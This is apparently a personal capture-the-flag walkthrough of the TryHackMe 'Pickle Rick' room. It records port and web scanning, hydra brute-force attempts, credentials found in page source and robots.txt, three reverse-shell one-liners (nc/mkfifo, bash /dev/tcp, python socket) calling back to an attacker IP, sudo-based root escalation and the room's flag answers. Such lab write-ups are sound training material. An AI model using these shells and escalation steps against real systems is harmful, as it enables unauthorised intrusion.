# https://tryhackme.com/room/picklerick

```bash
echo 'export TARGET=10.201.65.100' >> ~/.zshrc && source ~/.zshrc

└─# sudo nmap -n -Pn -sS -A -oA nmap_scan $TARGET
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4fe3b91a9199bb18de61a29e354e720d (RSA)
|   256 6287d57f6482b9f582f3de2ba61b2291 (ECDSA)
|_  256 630523f17f258ec23ff6b8588462f71e (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Rick is sup4r cool
|_http-server-header: Apache/2.4.41 (Ubuntu)

curl -o- $TARGET
//    Note to self, remember username!
//    Username: R1ckRul3s

└─# curl -o- http://10.201.65.100/robots.txt 
Wubbalubbadubdub

curl -o- http://10.201.65.100/assets/ 
<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/text.gif" alt="[TXT]"></td><td><a href="bootstrap.min.css">bootstrap.min.css</a></td><td align="right">2019-02-10 16:37  </td><td align="right">119K</td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="bootstrap.min.js">bootstrap.min.js</a></td><td align="right">2019-02-10 16:37  </td><td align="right"> 37K</td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/image2.gif" alt="[IMG]"></td><td><a href="fail.gif">fail.gif</a></td><td align="right">2019-02-10 16:37  </td><td align="right"> 49K</td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="jquery.min.js">jquery.min.js</a></td><td align="right">2019-02-10 16:37  </td><td align="right"> 85K</td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/image2.gif" alt="[IMG]"></td><td><a href="picklerick.gif">picklerick.gif</a></td><td align="right">2019-02-10 16:37  </td><td align="right">222K</td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/image2.gif" alt="[IMG]"></td><td><a href="portal.jpg">portal.jpg</a></td><td align="right">2019-02-10 16:37  </td><td align="right"> 50K</td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/image2.gif" alt="[IMG]"></td><td><a href="rickandmorty.jpeg">rickandmorty.jpeg</a></td><td align="right">2019-02-10 16:37  </td><td align="right">488K</td><td>&nbsp;</td></tr>
<address>Apache/2.4.41 (Ubuntu) Server at 10.201.65.100 Port 80</address>


whatweb -a 3 -v http://$TARGET
// Summary   : Apache[2.4.41], Bootstrap, HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], JQuery, Script

gobuster --quiet --threads 64 --output gobuster_dir_common dir --wordlist /usr/share/wordlists/dirb/common.txt --url $TARGET
/.hta                 (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/assets               (Status: 301) [Size: 315] [--> http://10.201.65.100/assets/]
/index.html           (Status: 200) [Size: 1062]
/robots.txt           (Status: 200) [Size: 17]
/server-status        (Status: 403) [Size: 278]

gobuster --quiet --threads 64 --output gobuster_dir_medium dir -r -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u $TARGET
// nothing new

gobuster dir --wordlist /usr/share/wordlists/dirb/common.txt --url http://$TARGET/assets/
// nothing

gobuster -q -t 64 dir --wordlist /usr/share/seclists/Discovery/Web-Content/big.txt --url http://$TARGET/
//nothing new

hydra -t 4 -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://$TARGET
// [ERROR] target ssh://10.201.65.100:22/ does not support password authentication (method reply 4).

wapiti http://$TARGET
//     Content Security Policy (CSP) is an added layer of security that helps to detect and mitigate certain types of attacks, including Cross Site Scripting (XSS) and data injection attacks.

nikto -h http://$TARGET -o nikto_scan.txt
// http://10.201.65.100/login.php
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.201.65.100
+ Target Hostname:    10.201.65.100
+ Target Port:        80
+ Start Time:         2025-10-04 21:34:20 (GMT0)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server may leak inodes via ETags, header found with file /, inode: 426, size: 5818ccf125686, mtime: gzip
+ Cookie PHPSESSID created without the httponly flag
+ Allowed HTTP Methods: HEAD, GET, POST, OPTIONS 
+ /login.php: Admin login page/section found.
+ 7915 requests: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2025-10-04 21:35:07 (GMT0) (47 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

curl 'http://10.201.65.100/login.php' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://10.201.65.100' -H 'Connection: keep-alive' -H 'Referer: http://10.201.65.100/login.php' -H 'Upgrade-Insecure-Requests: 1' --data-raw 'username=username&password=password&sub=Login'
//  Invalid username or password. 

hydra -t 16 -l 'R1ckRul3s' -P /usr/share/wordlists/rockyou.txt $TARGET http-post-form "/login.php:username=^USER^&password=^PASS^:F=Invalid:H=Accept-Encoding: gzip" -V
// not working

// log into: http://10.201.65.100/login.php
// R1ckRul3s:Wubbalubbadubdub

10.201.103.143
1234
nc -lvnp 1234
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.201.103.143 1234 > /tmp/f
// blocked
bash -i >& /dev/tcp/10.201.103.143/1234 0>&1
// froze?
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.201.103.143",1234));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
// works!
// stabilized shell

cat /var/www/html/Sup3rS3cretPickl3Ingred.txt
mr. meeseek hair

cat '/home/rick/second ingredients'
1 jerry tear

sudo -l
Matching Defaults entries for www-data on ip-10-201-65-100:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-201-65-100:
    (ALL) NOPASSWD: ALL

sudo su
// EZ root!

cat /root/3rd.txt
3rd ingredients: fleeb juice
```